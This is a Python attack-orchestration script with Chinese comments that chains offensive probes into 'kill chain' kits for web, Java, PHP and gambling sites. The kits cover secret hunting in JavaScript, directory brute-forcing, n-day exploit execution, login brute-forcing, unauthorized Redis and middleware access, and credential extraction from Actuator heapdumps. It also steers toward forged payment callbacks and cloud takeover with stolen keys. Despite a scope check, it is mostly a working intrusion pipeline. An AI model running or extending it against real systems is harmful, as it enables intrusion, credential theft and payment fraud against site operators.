#!/usr/bin/env python3
"""成套杀伤链执行器 — 把散装探针按已验证顺序串起来并做交接。

auto_campaign 是「指纹 → 并列工具菜单」。
本脚本是「选定套装 → 上一步 JSON 决定下一步，直到可验证结论或明确下一跳」。

  python3 炼蛊房/kit_run.py list
  python3 炼蛊房/kit_run.py run --kit web -u https://授权站 --case <案卷>
  python3 炼蛊房/kit_run.py run --kit java -u https://授权站 --case <案卷>
  python3 炼蛊房/kit_run.py run --kit php -u https://授权站 --case <案卷>
  python3 炼蛊房/kit_run.py run --kit gambling -u https://授权站 --case <案卷>
"""
from __future__ import annotations

import argparse
import json
import os
import signal
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from collections.abc import Callable
from urllib.parse import urlparse

OPS = Path(__file__).resolve().parent
ROOT = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

PY = sys.executable


def _olap_port_open(host: str, ports: tuple[int, ...] = (8030, 9030), timeout: float = 1.5) -> bool:
    """Doris/StarRocks FE 口开着才跑专卡，避免每站空耗。"""
    family = socket.AF_INET6 if ":" in (host or "") else socket.AF_INET
    for port in ports:
        sock = socket.socket(family, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((host, port))
            return True
        except OSError:
            continue
        finally:
            try:
                sock.close()
            except OSError:
                pass
    return False


def _now() -> str:
    return datetime.now(UTC).isoformat()


def _label_of(cmd: list[str]) -> str:
    for p in cmd:
        if p.endswith(".py"):
            return Path(p).name
    return cmd[0] if cmd else "cmd"


def _kill_pg(proc: subprocess.Popen[str]) -> None:
    """超时必须杀进程组，否则 dirbrute 线程池会把下一步拖死。"""
    if proc.poll() is not None:
        return
    try:
        os.killpg(proc.pid, signal.SIGTERM)
    except (ProcessLookupError, PermissionError, OSError):
        try:
            proc.terminate()
        except Exception:
            return
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError, OSError):
            try:
                proc.kill()
            except Exception:
                pass
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            pass


def _pump(pipe: Any, buf: list[str]) -> None:
    try:
        for line in iter(pipe.readline, ""):
            sys.stdout.write("    " + line)
            if not line.endswith("\n"):
                sys.stdout.write("\n")
            sys.stdout.flush()
            buf.append(line)
            if len(buf) > 400:
                del buf[:-120]
    except Exception:
        pass


def _run(cmd: list[str], timeout: int = 180, label: str = "") -> dict[str, Any]:
    """实时刷子进程输出；超时杀组后返回，不把整条套装卡死。"""
    title = label or _label_of(cmd)
    print(f"\n  ▶ {title}  (≤{timeout}s，超时杀组继续)", flush=True)
    print("  $ " + " ".join(cmd), flush=True)
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONIOENCODING"] = "utf-8"
    buf: list[str] = []
    t0 = time.monotonic()
    try:
        proc = subprocess.Popen(
            cmd,
            cwd=str(ROOT),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            env=env,
            start_new_session=True,
        )
    except Exception as e:
        print(f"  [err] 拉不起 {title}: {e}", flush=True)
        return {"ok": False, "cmd": cmd, "error": str(e)}

    th = threading.Thread(target=_pump, args=(proc.stdout, buf), daemon=True)
    th.start()
    timed_out = False
    last_beat = t0
    while proc.poll() is None:
        elapsed = time.monotonic() - t0
        if elapsed >= timeout:
            timed_out = True
            print(f"  [timeout] {title} >{timeout}s，杀进程组后继续下一步", flush=True)
            _kill_pg(proc)
            break
        if time.monotonic() - last_beat >= 10:
            print(f"  … {title} 运行中 {int(elapsed)}s/{timeout}s", flush=True)
            last_beat = time.monotonic()
        time.sleep(0.2)
    th.join(timeout=2)
    if proc.stdout:
        try:
            proc.stdout.close()
        except Exception:
            pass
    rc = proc.poll()
    tail = "".join(buf)[-2500:]
    if timed_out:
        return {"ok": False, "cmd": cmd, "error": f"timeout>{timeout}s", "tail": tail}
    if not tail.strip():
        print("  (no output)", flush=True)
    return {
        "ok": rc == 0,
        "returncode": rc,
        "cmd": cmd,
        "tail": tail,
    }


def _read_json(path: Path) -> dict[str, Any]:
    if not path.is_file():
        return {}
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _js_key_salt(js: dict[str, Any]) -> tuple[str, str]:
    aes, salt = "", ""
    for f in js.get("findings") or []:
        cat = str(f.get("category", ""))
        score = int(f.get("score") or 0)
        val = str(f.get("value") or "")
        if score < 60 or not val:
            continue
        if not aes and "aes" in cat:
            aes = val
        if not salt and "salt" in cat:
            salt = val
    return aes, salt


# ── 套装定义 ──────────────────────────────────────────────────────

KITS: dict[str, dict[str, Any]] = {
    "web": {
        "title": "通用网站成套",
        "win": "JS 密钥可重放，或备份/面板打开，或 nday 已钉专卡并执行",
        "playbook": "传承/凤九歌·天地歌.md",
    },
    "java": {
        "title": "Java 管理面成套",
        "win": "Shiro/Druid/Jeecg 弱口或 Actuator heapdump 可下，接到堆转云",
        "playbook": "传承/春府·开棺.md",
    },
    "php": {
        "title": "PHP 主机成套",
        "win": "ThinkPHP 信任头/.env，或日志泄商户钥合法签，或 PMA 弱口",
        "playbook": "传承/秦百胜·拍卖.md",
    },
    "gambling": {
        "title": "博彩/盘口成套",
        "win": "AES+salt 重放 API，或非标口管理面，或支付 notify 交给假支付",
        "playbook": "传承/凤九歌·认族.md",
    },
}


def kit_web(ctx: dict[str, Any]) -> None:
    url, case, out = ctx["url"], ctx["case"], ctx["out"]
    print("  步骤: JS hunt → (有密钥) dispatcher → dirbrute → strike → nday/专卡", flush=True)
    js_path = out / "js_secrets.json"
    ctx["log"].append(_run([
        PY, str(OPS / "js_secret_hunter.py"), "hunt", "-u", url, "--out", str(js_path), "--case", case,
    ], timeout=120))
    js = _read_json(js_path)
    aes, salt = _js_key_salt(js)
    ctx["aes"], ctx["salt"] = aes, salt
    if aes and salt:
        api = url.rstrip("/") + "/api.html"
        ctx["log"].append(_run([
            PY, str(OPS / "api_dispatcher_enum.py"), "scan",
            "--base", api, "--key", aes, "--salt", salt, "--case", case,
        ], timeout=180))
        ctx["handoff"].append("JS 密钥已灌 dispatcher；支付 notify 再跑 pay_matrix")
    else:
        ctx["handoff"].append("无高分 AES/salt → 不跑 dispatcher")

    db = out / "dirbrute.json"
    ctx["log"].append(_run([
        PY, str(OPS / "dirbrute_probe.py"), "-u", url, "--out", str(db), "--case", case,
    ], timeout=180))
    hits = _read_json(db).get("hits") or []
    if any(".env" in str(h.get("path", "")) for h in hits):
        ctx["handoff"].append(".env 命中 → 密钥打码后回灌假支付")
    if any("phpmyadmin" in str(h.get("path", "")).lower() or h.get("path") == "/pma/" for h in hits):
        ctx["handoff"].append("PMA 路径 → 已由 php 套装做弱口；本套继续 nday")

    st = out / "strike.json"
    ctx["log"].append(_run([
        PY, str(OPS / "strike_probe.py"), "-u", url, "--out", str(st), "--case", case,
    ], timeout=180))
    for f in _read_json(st).get("findings") or []:
        if f.get("level") == "L2":
            ctx["handoff"].append(f"突击 {f.get('stage')} L2 {f.get('signal')} → 黑盒突击层手法")

    nd = out / "nday_route.json"
    ctx["log"].append(_run([
        PY, str(OPS / "nday_route.py"), "-u", url, "--out", str(nd), "--case", case,
    ], timeout=90))
    njson = _read_json(nd)
    ran = 0
    for hit in (njson.get("hits") or [])[:3]:
        cmd = str(hit.get("cmd") or "")
        if not cmd.startswith("python3 炼蛊房/") and not cmd.startswith("python3 tools/1day-kit/"):
            ctx["handoff"].append(f"nday 下一跳（手跑）: {cmd}")
            continue
        # 把仓库相对命令拆成 argv
        parts = cmd.replace("python3 ", PY + " ", 1).split()
        parts = [p.replace("{out}", str(out)).replace("{case}", case).replace("<案卷>", case) for p in parts]
        ctx["log"].append(_run(parts, timeout=180))
        ran += 1
        ctx["handoff"].append(f"已执行 nday 专卡 {hit.get('id')}")
    if not ran:
        ctx["handoff"].append("nday 无 python 专卡命中 → jwt_gql")
        ctx["log"].append(_run([
            PY, str(OPS / "jwt_gql_probe.py"), "-u", url, "--out", str(out / "jwt_gql.json"), "--case", case,
        ], timeout=90))

    cw = out / "core_web.json"
    ctx["log"].append(_run([
        PY, str(OPS / "core_web_surface_probe.py"), "-u", url, "--fast", "--out", str(cw), "--case", case,
    ], timeout=120))
    for f in _read_json(cw).get("findings") or []:
        if f.get("level") == "L2":
            ctx["handoff"].append(f"核心Web L2 {f.get('family')} {f.get('signal')} → 核心Web漏洞面作业手法")
    ctx["log"].append(_run([
        PY, str(OPS / "auth_brute_probe.py"), "-u", url,
        "--out", str(out / "auth_brute.json"), "--case", case,
    ], timeout=90))
    if _read_json(out / "auth_brute.json").get("findings"):
        ctx["handoff"].append("弱口 L2 → 填对象矩阵，禁止只登录结案")

    host = urlparse(url).hostname or ""
    if host and _olap_port_open(host):
        ctx["log"].append(_run([
            PY, str(OPS / "doris_probe.py"), "--host", host,
            "--out", str(out / "doris.json"), "--case", case,
        ], timeout=40))
        doris = _read_json(out / "doris.json")
        if doris.get("level") == "L2":
            ctx["handoff"].append("Doris/StarRocks L2 → Apache-Doris未授权三板斧；OUTFILE 先问")


def _existing_heaps(root: Path) -> list[Path]:
    if not root.is_dir():
        return []
    out: list[Path] = []
    for ext in ("*.hprof", "*.phd", "*.heap", "*.bin"):
        out.extend(p for p in root.glob(ext) if p.stat().st_size > 64)
    return sorted(out)


def _split_heapdump(ctx: dict[str, Any], probe: dict[str, Any]) -> None:
    """heapdump 可达或案卷已有堆 → from-probe 下堆+蓝鸟拆。"""
    dump_dir = Path(ctx["case_root"]) / "测绘" / "heapdump"
    cred_dir = Path(ctx["case_root"]) / "接管" / "heap_creds"
    probe_path = Path(ctx["out"]) / "actuator" / "probe.json"
    cmd = [
        PY, str(OPS / "heap_cred_scan.py"), "from-probe",
        "--probe", str(probe_path),
        "--dump-dir", str(dump_dir),
        "--out", str(cred_dir),
    ]
    if ctx.get("case"):
        cmd.extend(["--case", str(ctx["case"])])
    ctx["log"].append(_run(cmd, timeout=2700))
    if (cred_dir / "HEAP_CREDS.json").is_file():
        ctx["handoff"].append(
            f"堆已拆 {cred_dir}/HEAP_CREDS.json → 验证 LTAI/JDBC/Redis/Shiro，禁止只报 LTAI"
        )
        return
    ctx["handoff"].append(
        "heapdump 可达但未落下 HEAP_CREDS.json → 看 kit 日志，重跑 from-probe"
    )


def kit_java(ctx: dict[str, Any]) -> None:
    url, case, out = ctx["url"], ctx["case"], ctx["out"]
    print("  步骤: java_web → actuator → (无 heapdump 则 Redis)", flush=True)
    jw = out / "java_web.json"
    ctx["log"].append(_run([
        PY, str(OPS / "java_web_surface_probe.py"), "-u", url, "--out", str(jw), "--case", case,
    ], timeout=180))
    jdata = _read_json(jw)
    for f in jdata.get("findings") or []:
        sig = str(f.get("signal", ""))
        if "weak-key" in sig or "weak-login" in sig:
            ctx["handoff"].append(f"Java L2 HIT {f.get('stack')} {sig} → 对应手法卡收割配置")
        if f.get("stack") == "xxljob":
            ctx["log"].append(_run([
                PY, str(OPS / "xxljob_admin_probe.py"), "--base", url,
                "--out", str(out / "xxljob.json"), "--case", case,
            ], timeout=60))
            ctx["handoff"].append("XXL-JOB → xxljob_admin_probe（列执行器；GLUE 先问）")
            break

    act_dir = out / "actuator"
    ctx["log"].append(_run([
        PY, str(OPS / "actuator_probe.py"), "--base", url, "--out", str(act_dir),
    ], timeout=90))
    probe = _read_json(act_dir / "probe.json")
    if probe.get("heapdump_exposed") or _existing_heaps(Path(ctx["case_root"]) / "测绘" / "heapdump"):
        _split_heapdump(ctx, probe)
        ctx["handoff"].append("抽到 LTAI → GetCallerIdentity / 芋道 syscache（Actuator 堆转云专卡）")
    elif probe.get("gateway_routes_exposed"):
        ctx["handoff"].append("gateway/routes → SpringCloud 网关 Actuator 全链，禁止只扫 health")
    else:
        ctx["handoff"].append("无 heapdump → Redis 旁注")
        host = urlparse(url).hostname or ""
        ctx["log"].append(_run([
            PY, str(OPS / "redis_unauth_probe.py"), "--host", host, "--port", "6379",
            "--out", str(out / "redis.json"), "--case", case,
        ], timeout=40))
        ctx["log"].append(_run([
            PY, str(OPS / "middleware_unauth_probe.py"), "--host", host,
            "--out", str(out / "middleware.json"), "--case", case,
        ], timeout=25))
        mw = _read_json(out / "middleware.json")
        if any(f.get("signal") != "es-auth-required" for f in (mw.get("findings") or [])):
            ctx["handoff"].append("Mongo/ES/Memcached 未授权 → 中间件未授权作业手法")
        if _olap_port_open(host):
            ctx["log"].append(_run([
                PY, str(OPS / "doris_probe.py"), "--host", host,
                "--out", str(out / "doris.json"), "--case", case,
            ], timeout=40))
            doris = _read_json(out / "doris.json")
            if doris.get("level") == "L2":
                ctx["handoff"].append("Doris/StarRocks L2 → Apache-Doris未授权三板斧；OUTFILE 先问")


def kit_php(ctx: dict[str, Any]) -> None:
    url, case, out = ctx["url"], ctx["case"], ctx["out"]
    print("  步骤: ThinkPHP → 日志/composer → dirbrute → 面板 → Redis → FastAdmin", flush=True)
    ctx["log"].append(_run([
        PY, str(OPS / "thinkphp_surface_probe.py"), "-u", url,
        "--out", str(out / "thinkphp.json"), "--case", case,
    ], timeout=60))
    ctx["log"].append(_run([
        PY, str(OPS / "sensitive_dir_dump_probe.py"), "hunt", "--base", url,
        "--out", str(out / "dir_dump.json"), "--case", case,
    ], timeout=180))
    dump = _read_json(out / "dir_dump.json")
    if dump.get("level") in {"L2", "L3"} or dump.get("keys"):
        ctx["handoff"].append(
            "日志/.env/AI目录含钥 → payment-callback-forgery 合法签（F-01，先于支付栈）"
        )
    if any(f.get("signal") == "stack-manifest" for f in dump.get("findings") or []):
        ctx["handoff"].append("composer.json 暴露 → 认 PHP/独角，继续抽 laravel.log")
    ctx["log"].append(_run([
        PY, str(OPS / "dirbrute_probe.py"), "-u", url,
        "--out", str(out / "dirbrute.json"), "--case", case,
    ], timeout=180))
    ctx["log"].append(_run([
        PY, str(OPS / "panel_surface_probe.py"), "-u", url,
        "--out", str(out / "panel.json"), "--case", case,
    ], timeout=90))
    host = urlparse(url).hostname or ""
    ctx["log"].append(_run([
        PY, str(OPS / "redis_unauth_probe.py"), "--host", host, "--port", "6379",
        "--out", str(out / "redis.json"), "--case", case,
    ], timeout=40))
    panel = _read_json(out / "panel.json")
    if any(f.get("signal") == "weak-login" for f in panel.get("findings") or []):
        ctx["handoff"].append("PMA/Adminer 弱口 HIT → 读库名/.env，不 mysqldump")
    redis = _read_json(out / "redis.json")
    if any(f.get("hot_keys") for f in redis.get("findings") or []):
        ctx["handoff"].append("Redis captcha 键 → 若依验证码旁路登录")
    tp = _read_json(out / "thinkphp.json")
    if any(f.get("signal") == "env-exposed" for f in tp.get("findings") or []):
        ctx["handoff"].append(".env 暴露 → 密钥回灌假支付")
    if any(f.get("signal") == "ip-header-status-delta" for f in tp.get("findings") or []):
        ctx["handoff"].append("Client-IP 差分 → IP白名单绕过杀伤链")
    if any(f.get("signal") in {"thinkphp-readme", "tp3-modded", "fenxiao-hint"} for f in tp.get("findings") or []):
        ctx["log"].append(_run([
            PY, str(OPS / "tp3_fenxiao_probe.py"), "-u", url,
            "--out", str(out / "tp3_fenxiao.json"), "--case", case,
        ], timeout=90))
        ctx["handoff"].append("TP3 README/魔改 → tp3_fenxiao_probe（禁止 DELETE OR）")
    ctx["log"].append(_run([
        PY, str(OPS / "strike_probe.py"), "-u", url,
        "--out", str(out / "strike.json"), "--case", case,
    ], timeout=180))
    ctx["log"].append(_run([
        PY, str(OPS / "core_web_surface_probe.py"), "-u", url, "--fast",
        "--out", str(out / "core_web.json"), "--case", case,
    ], timeout=120))
    ctx["log"].append(_run([
        PY, str(OPS / "auth_brute_probe.py"), "-u", url,
        "--out", str(out / "auth_brute.json"), "--case", case,
    ], timeout=90))
    ctx["log"].append(_run([
        PY, str(OPS / "middleware_unauth_probe.py"), "--host", host,
        "--out", str(out / "middleware.json"), "--case", case,
    ], timeout=25))
    if _olap_port_open(host):
        ctx["log"].append(_run([
            PY, str(OPS / "doris_probe.py"), "--host", host,
            "--out", str(out / "doris.json"), "--case", case,
        ], timeout=40))
        if _read_json(out / "doris.json").get("level") == "L2":
            ctx["handoff"].append("Doris/StarRocks L2 → Apache-Doris未授权三板斧；OUTFILE 先问")
    ctx["log"].append(_run([
        PY, str(OPS / "fastadmin_daifu_probe.py"), "recon",
        "--base", url, "--case", case, "--insecure",
    ], timeout=90))
    fa = _read_json(ROOT / "案卷" / case / "测绘" / "fastadmin_daifu" / "recon.json")
    if any(x.get("hit") for x in (fa.get("demo") or []) + (fa.get("portals") or [])):
        ctx["handoff"].append(
            "FastAdmin 代付面 HIT → dump-part + crack；"
            "真源 快府·代付.md（multi money ≠ 结算）"
        )
    ctx["log"].append(_run([
        PY, str(OPS / "fastadmin_shop_tenant_probe.py"), "recon",
        "--base", url, "--case", case, "--insecure",
    ], timeout=60))
    shop = _read_json(
        ROOT / "案卷" / case / "测绘" / "fastadmin_shop_tenant" / "recon.json"
    )
    if any((v or {}).get("hit") for v in (shop.get("login") or {}).values()):
        ctx["handoff"].append(
            "FastAdmin Shop HIT → 有票立刻 gt-probe（EQ 阴性不算隔离）；"
            "真源 快府·横夺.md"
        )


def kit_gambling(ctx: dict[str, Any]) -> None:
    print("  步骤: 先 web 套装，再 yudao 认族 + 非标口", flush=True)
    kit_web(ctx)
    url, case, out = ctx["url"], ctx["case"], ctx["out"]
    host = urlparse(url).hostname or ""
    yu = out / "yudao_appapi.json"
    ctx["log"].append(_run([
        PY, str(OPS / "yudao_appapi_probe.py"), "-u", url, "--case", case, "--out", str(yu),
    ], timeout=90))
    fam = (_read_json(yu) or {}).get("family") or "unknown"
    if fam != "unknown":
        ctx["handoff"].append(f"认族 {fam} → 传承/商心慈·白标.md")
    ctx["log"].append(_run([
        PY, str(OPS / "port_admin_scan.py"), "scan", "--domain", host, "--case", case,
    ], timeout=120))
    ctx["handoff"].append(f"有 notify/callback → python3 炼蛊房/pay_matrix.py --base {url} --case {case}")
    ctx["handoff"].append("有 APK → apk_recon；后台 403 → ip_whitelist_bypass")


RUNNERS: dict[str, Callable[[dict[str, Any]], None]] = {
    "web": kit_web,
    "java": kit_java,
    "php": kit_php,
    "gambling": kit_gambling,
}


def cmd_list(_: argparse.Namespace) -> int:
    print("成套杀伤链（kit_run）— 散装探针的顺序 + 交接\n")
    for kid, meta in KITS.items():
        print(f"  {kid:10s}  {meta['title']}")
        print(f"             成功口径: {meta['win']}")
        print(f"             {meta['playbook']}")
        print()
    print("用法: python3 炼蛊房/kit_run.py run --kit web -u https://授权站 --case <案卷>")
    print("资金套装仍用: python3 炼蛊房/pay_matrix.py --base … --case …")
    print("发卡分流: /dj.svg → dujiao-next-1yuan-pay；composer/日志 → sensitive_dir + 假支付；acg.js → acg_probe")
    return 0


def cmd_run(args: argparse.Namespace) -> int:
    kit = args.kit
    if kit not in RUNNERS:
        raise SystemExit(f"[err] 未知套装 {kit}，先 kit_run.py list")
    url = args.url.rstrip("/")
    host = host_of(url)
    if host and not in_scope(host):
        raise SystemExit(f"[scope] {host} 不在授权范围")
    case = args.case
    case_root = ROOT / "案卷" / case
    out = case_root / "测绘" / "kit" / kit
    out.mkdir(parents=True, exist_ok=True)
    ctx: dict[str, Any] = {
        "url": url,
        "case": case,
        "out": out,
        "case_root": case_root,
        "log": [],
        "handoff": [],
        "aes": "",
        "salt": "",
    }
    print(f"\n=== kit {kit}  {KITS[kit]['title']}  ===")
    print(f"    {KITS[kit]['win']}")
    print("    子进程实时刷进度；单步超时会杀进程组并继续，不会整段无声卡死。\n", flush=True)
    RUNNERS[kit](ctx)
    gate = _run(
        [PY, str(OPS / "evidence_gate.py"), "--case", case, "--from-status"],
        timeout=60,
        label="evidence_gate",
    )
    ctx["log"].append(gate)
    ctx["handoff"].append(
        f"结案前：python3 炼蛊房/evidence_gate.py --case {case} --from-status；"
        f"有身份先 object_matrix.py check --strict（使证闸.md）"
    )
    if not gate.get("ok"):
        ctx["handoff"].append(
            "evidence_gate FAIL：L 级/CVE 须出现在 案卷/接管/支付/证据，禁止只写 STATUS"
        )
    report = {
        "ts": _now(),
        "kit": kit,
        "title": KITS[kit]["title"],
        "target": url,
        "case": case,
        "win": KITS[kit]["win"],
        "playbook": KITS[kit]["playbook"],
        "steps": [
            {"ok": x.get("ok"), "cmd": x.get("cmd"), "error": x.get("error", "")}
            for x in ctx["log"]
        ],
        "handoff": ctx["handoff"],
    }
    rp = out / "kit_report.json"
    rp.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print("\n--- 交接 ---")
    for h in ctx["handoff"]:
        print(f"  → {h}")
    print(f"\n[+] {rp}")
    ok_n = sum(1 for x in ctx["log"] if x.get("ok"))
    print(f"[result] steps_ok={ok_n}/{len(ctx['log'])}")
    return 0 if ctx["log"] else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="成套杀伤链（授权范围内）")
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("list")
    p.set_defaults(func=cmd_list)
    r = sub.add_parser("run")
    r.add_argument("--kit", required=True, choices=sorted(KITS))
    r.add_argument("-u", "--url", required=True)
    r.add_argument("--case", required=True)
    r.set_defaults(func=cmd_run)
    args = ap.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
